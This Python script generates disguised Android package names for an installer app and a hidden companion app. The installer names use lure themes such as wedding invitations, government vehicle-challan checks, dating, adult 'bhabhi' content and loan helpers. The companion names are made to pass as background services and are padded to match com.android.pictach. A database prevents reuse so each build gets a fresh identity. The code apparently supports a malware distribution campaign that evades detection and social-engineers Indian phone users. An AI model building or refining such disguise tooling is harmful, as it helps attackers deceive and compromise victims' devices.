#!/usr/bin/env python3
"""
package_name_generator.py
Generates legitimate-looking, template-specific package names for
companion app installer (Nova) and companion app.

Rules:
  - 3 segments only: {tld}.{word1word2}.{word3word4}
  - Installer: com. prefix, template-specific words, looks like Indian startup
  - Companion: com. prefix, boring utility words, looks like background service
  - Length: 25-45 chars total
  - No real brand names (PhonePe, Paytm, etc.)
  - No system-reserved prefixes (com.android, com.google)
  - Date-based version code: YYYYMMDD + 2 random digits
  - SQLite DB tracks used pairs (path: scripts/used_packages.db)

Usage:
  python3 scripts/package_name_generator.py --template wedding
  python3 scripts/package_name_generator.py --template mparivahan
  python3 scripts/package_name_generator.py --template friends
  python3 scripts/package_name_generator.py --template bhabhi
  python3 scripts/package_name_generator.py --template custom --name "Loan Helper"
  python3 scripts/package_name_generator.py --nova-only
  python3 scripts/package_name_generator.py --companion-only

Output (to stdout, one per line):
  INSTALLER_PKG=com.shaadicard.invitemaker
  COMPANION_PKG=com.datasync.backgroundworker
  VERSION_CODE=2026072847
"""

import argparse
import random
import secrets
import sqlite3
import sys
import os
from datetime import datetime

# ── DB path ───────────────────────────────────────────────────────────────────
DB_PATH = os.path.join(os.path.dirname(__file__), 'used_packages.db')

# ── Template-specific installer word pools ────────────────────────────────────
# Structure: in.{word1}{word2}.{word3}{word4}
# Sounds like a real Indian startup name

TEMPLATE_POOLS = {
    'wedding': {
        'word1': [
            'shaadi','vivah','byah','shubh','mangal','dulhan',
            'mandap','barat','mehendi','sindoor','anand','milan',
            'lagan','saptapadi','vidai','kanyadaan','gotra','phere',
            'invite','card',
        ],
        'word2': [
            'card','maker','studio','hub','zone','link',
            'pro','lite','app','helper','connect','planner',
            'digital','online','india','bharat','seva','suvidha',
            'quick','easy',
        ],
        'word3': [
            'invitation','invite','wedding','shaadi','vivah',
            'card','maker','designer','creator','sender',
            'share','print','template','album','gallery',
            'digital','online','india','bharat','celebration',
        ],
        'word4': [
            'app','pro','lite','plus','hub','zone',
            'india','bharat','desh','studio','maker',
            'helper','connect','digital','online','service',
            'solutions','tech','mobile','soft',
        ],
    },
    'mparivahan': {
        'word1': [
            'vahan','parivahan','sarak','challan','fasttag',
            'rccheck','dlcheck','gaadi','motor','auto',
            'raasta','highway','toll','permit','rto',
            'noc','fitness','transport','traffic','drive',
        ],
        'word2': [
            'seva','suvidha','check','verify','track',
            'status','info','app','helper','india',
            'bharat','online','digital','quick','fast',
            'easy','smart','lite','pro','plus',
        ],
        'word3': [
            'vehicle','vahan','rc','dl','challan',
            'permit','noc','fitness','insurance','fasttag',
            'registration','licence','driving','transport','traffic',
            'motor','auto','sarak','highway','toll',
        ],
        'word4': [
            'check','verify','status','tracker','finder',
            'helper','india','bharat','seva','suvidha',
            'app','pro','lite','online','digital',
            'quick','fast','smart','easy','mobile',
        ],
    },
    'friends': {
        'word1': [
            'dost','yaar','mitra','bandhu','sakha',
            'saathi','milna','sampark','jodna','pyaar',
            'rishtey','nata','yaari','dostana','mohabbat',
            'dil','connect','meet','social','chat',
        ],
        'word2': [
            'app','hub','zone','link','connect',
            'india','bharat','online','digital','quick',
            'fast','easy','lite','pro','plus',
            'seva','suvidha','meet','chat','talk',
        ],
        'word3': [
            'friend','dost','yaar','mitra','connect',
            'meet','chat','talk','share','social',
            'date','match','circle','group','network',
            'yaari','dostana','bandhan','milan','jodna',
        ],
        'word4': [
            'app','pro','lite','plus','hub',
            'india','bharat','online','digital','zone',
            'connect','finder','maker','helper','link',
            'quick','fast','smart','easy','mobile',
        ],
    },
    'bhabhi': {
        'word1': [
            'fun','masti','anand','khushi','josh',
            'rangeen','dhamaka','hungama','manoranjan','timepass',
            'mazaa','tamasha','bindaas','jhakaas','fatafat',
            'ekdum','shandaar','zabardast','dilchasp','rangin',
        ],
        'word2': [
            'app','hub','zone','link','live',
            'india','bharat','online','digital','quick',
            'fast','easy','lite','pro','plus',
            'video','stream','meet','call','chat',
        ],
        'word3': [
            'video','live','stream','meet','call',
            'chat','fun','masti','entertainment','media',
            'content','reels','short','clip','show',
            'watch','enjoy','play','view','browse',
        ],
        'word4': [
            'app','pro','lite','plus','hub',
            'india','bharat','online','digital','zone',
            'live','stream','player','viewer','connect',
            'quick','fast','smart','easy','mobile',
        ],
    },
}

# ── Companion app word pools (boring utility background service look) ──────────
# Structure: com.{word1}{word2}.{word3}{word4}
# Sounds like a legitimate background utility from a small startup

COMPANION_POOL = {
    'word1': [
        'data','cache','app','file','task',
        'work','back','sync','keep','hold',
        'run','load','save','send','fetch',
        'push','pull','read','write','scan',
    ],
    'word2': [
        'sync','clean','guard','watch','flow',
        'track','check','boost','clear','manage',
        'update','store','fetch','relay','bridge',
        'proxy','route','queue','batch','stream',
    ],
    'word3': [
        'background','silent','passive','internal','embedded',
        'managed','unified','central','global','local',
        'active','primary','base','main','meta',
        'infra','inter','micro','auto','smart',
    ],
    'word4': [
        'worker','service','task','runner','handler',
        'agent','process','daemon','helper','manager',
        'tracker','monitor','executor','scheduler','provider',
        'bridge','relay','adapter','resolver','controller',
    ],
}

# ── Utilities ─────────────────────────────────────────────────────────────────

def init_db():
    conn = sqlite3.connect(DB_PATH)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS used_packages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            installer_pkg TEXT UNIQUE NOT NULL,
            companion_pkg TEXT UNIQUE NOT NULL,
            template TEXT,
            version_code TEXT,
            created_at TEXT DEFAULT (datetime('now'))
        )
    """)
    conn.commit()
    return conn


def is_used(conn, installer_pkg, companion_pkg):
    r1 = conn.execute(
        "SELECT 1 FROM used_packages WHERE installer_pkg=?", (installer_pkg,)
    ).fetchone()
    r2 = conn.execute(
        "SELECT 1 FROM used_packages WHERE companion_pkg=?", (companion_pkg,)
    ).fetchone()
    return bool(r1 or r2)


def save_pair(conn, installer_pkg, companion_pkg, template, version_code):
    conn.execute(
        "INSERT OR IGNORE INTO used_packages "
        "(installer_pkg, companion_pkg, template, version_code) VALUES (?,?,?,?)",
        (installer_pkg, companion_pkg, template, version_code)
    )
    conn.commit()


def validate_length(pkg, min_len=25, max_len=45):
    return min_len <= len(pkg) <= max_len

def validate_companion_length(pkg):
    """Companion pkg must be EXACTLY 20 chars to match com.android.pictach length."""
    return len(pkg) == 20


def generate_installer_pkg(template, custom_words=None):
    """Generate installer package name for given template."""
    pool = TEMPLATE_POOLS.get(template)
    if not pool and custom_words:
        # Custom template — build pool from keywords
        pool = _build_custom_pool(custom_words)
    if not pool:
        pool = TEMPLATE_POOLS['wedding']  # fallback

    for _ in range(1000):
        w1 = random.choice(pool['word1'])
        w2 = random.choice(pool['word2'])
        w3 = random.choice(pool['word3'])
        w4 = random.choice(pool['word4'])

        # Mix: sometimes in. prefix, sometimes com.
        tld = 'com'  # 'in' is a Kotlin reserved keyword — never use as TLD
        seg2 = f"{w1}{w2}"
        seg3 = f"{w3}{w4}"
        pkg  = f"{tld}.{seg2}.{seg3}"

        if validate_length(pkg):
            return pkg

    raise RuntimeError("Could not generate valid installer package name")


def generate_companion_pkg():
    """Generate companion package name — exactly 20 chars to match com.android.pictach.
    
    Format: com.{seg2}.{seg3} where total = 20 chars
    com. = 4 chars, one dot = 1 char → seg2 + seg3 = 15 chars total
    Split: seg2 = 7 chars, seg3 = 8 chars (or other combos summing to 15)
    
    Uses real utility words truncated/padded to hit exact lengths.
    Looks like legitimate background service app.
    """
    # Words chosen so seg2+seg3 = exactly 15 chars
    # com.(7chars).(8chars) = 4+7+1+8 = 20 chars exactly
    seg2_words = [
        'datasyn', 'filemng', 'appclnr', 'taskmgr', 'cacheop',
        'workrun', 'syncmgr', 'storemg', 'pushsvc', 'scanmgr',
        'fetchop', 'batchmg', 'queuemg', 'streamr', 'loadmgr',
        'savemgr', 'readmgr', 'writemg', 'backrun', 'keepmgr',
    ]
    seg3_words = [
        'bgworker', 'sservice', 'batchjob', 'runnable', 'taskreln',
        'executor', 'provider', 'resolver', 'tracklog', 'monitorx',
        'handlers', 'managedx', 'internalx'[:8], 'globalop', 'localops',
        'autorunx', 'smartops', 'microops', 'infraops', 'interops',
    ]
    # Trim all to exact lengths
    seg2_words = [w[:7].ljust(7, 'x') for w in seg2_words]
    seg3_words = [w[:8].ljust(8, 'x') for w in seg3_words]

    for _ in range(1000):
        seg2 = random.choice(seg2_words)
        seg3 = random.choice(seg3_words)
        pkg  = f"com.{seg2}.{seg3}"
        if validate_companion_length(pkg):
            return pkg

    raise RuntimeError("Could not generate 20-char companion package name")


def generate_version_code():
    """Date-based version code: YYYYMMDD + 2 random digits."""
    today = datetime.now().strftime('%Y%m%d')
    suffix = str(secrets.randbelow(90) + 10)  # 10-99
    return today + suffix


def _build_custom_pool(keywords):
    """Build word pool from custom app name keywords."""
    # Extract root words from app name
    words = [w.lower() for w in keywords.split() if len(w) > 2]
    if not words:
        words = ['app', 'service']

    # Use keywords + generic Indian utility words as pool
    generic = ['app','pro','lite','plus','india','bharat','digital',
               'online','seva','suvidha','quick','fast','smart','easy','hub']

    return {
        'word1': words + generic[:5],
        'word2': generic,
        'word3': words + generic[:8],
        'word4': generic,
    }


def generate_pair(template='wedding', custom_name=None):
    """Generate unique installer + companion package pair."""
    conn = init_db()

    keywords = custom_name if custom_name else None

    for attempt in range(10000):
        installer = generate_installer_pkg(template, keywords)
        companion = generate_companion_pkg()
        version   = generate_version_code()

        if not is_used(conn, installer, companion):
            save_pair(conn, installer, companion, template, version)
            conn.close()
            return installer, companion, version

    conn.close()
    raise RuntimeError("Could not generate unique package pair after 10000 attempts")


# ── CLI ───────────────────────────────────────────────────────────────────────

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--template', default='wedding',
        choices=['wedding', 'mparivahan', 'friends', 'bhabhi', 'custom'])
    parser.add_argument('--name', default=None,
        help='Custom app name (used when --template=custom)')
    parser.add_argument('--nova-only', action='store_true',
        help='Generate only Nova (installer) package name')
    parser.add_argument('--companion-only', action='store_true',
        help='Generate only companion package name')
    args = parser.parse_args()

    installer, companion, version = generate_pair(
        template=args.template,
        custom_name=args.name
    )

    if args.nova_only:
        print(installer)
    elif args.companion_only:
        print(companion)
    else:
        print(f"INSTALLER_PKG={installer}")
        print(f"COMPANION_PKG={companion}")
        print(f"VERSION_CODE={version}")
